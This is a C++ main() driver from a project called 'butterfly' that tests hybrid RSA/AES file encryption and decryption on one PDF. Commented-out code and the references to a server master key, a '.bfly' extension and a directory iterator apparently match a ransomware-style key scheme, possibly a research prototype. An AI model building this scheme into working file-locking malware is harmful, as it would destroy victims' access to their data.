
#include <memory>

#include "argumentParser.h"
#include "directoryIterator.h"
#include "crypto/encryptor.h"
#include "crypto/decryptor.h"

#include "crypto/aesEncryptor.h"
#include "crypto/aesDecryptor.h"

#include "utils.h"

int main(int argc, char *argv[])
{

    // parse args with the argument parser
    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
    butterfly::ArgumentParser::Arguments arg = argparse->parseArgs(argc, argv);

    LOG_INFO("Start application " << PROJECT_NAME << " with version " << arg._version);
    //std::shared_ptr<butterfly::DirectoryIterator> dirIterator(new butterfly::DirectoryIterator());

    /*
    // start encryption
    std::unique_ptr<butterfly::Encryptor> encryptor(new butterfly::Encryptor(2048));
    encryptor->encryptCPrivateRSA();

    encryptor->encryptAESKey();

    sleep(2);

    // start decryption
    std::unique_ptr<butterfly::Decryptor> decryptor(new butterfly::Decryptor());
    std::string cprivate = decryptor->decryptCPrivateRSA(
            "/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
    decryptor->decryptAESKey(cprivate);
    */


    /*
    std::unique_ptr<butterfly::aes::AESEncryptor> aesEncryptor(new butterfly::aes::AESEncryptor());
    aesEncryptor->generateAESKey();
    std::string aeskey = aesEncryptor->getAESKey();
    std::string aesiv = aesEncryptor->getAESIv();
    butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
    butterfly::writeBinFile("AESIv.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));
    std::string s = "/home/christian/projects/butterfly/bin/test.pdf";
    aesEncryptor->encryptFile(s);
    */


    std::unique_ptr<butterfly::aes::AESDecryptor> aesDecryptor(new butterfly::aes::AESDecryptor());
    std::string aeskey = butterfly::readBinFile("AESKey.txt");
    std::string aesiv = butterfly::readBinFile("AESIv.txt");
    aesDecryptor->setAESKey(aeskey);
    aesDecryptor->setAESIv(aesiv);
    std::string s = "/home/christian/projects/butterfly/bin/test.pdf.bfly";
    aesDecryptor->decryptFile(s);

    
     return 0;
}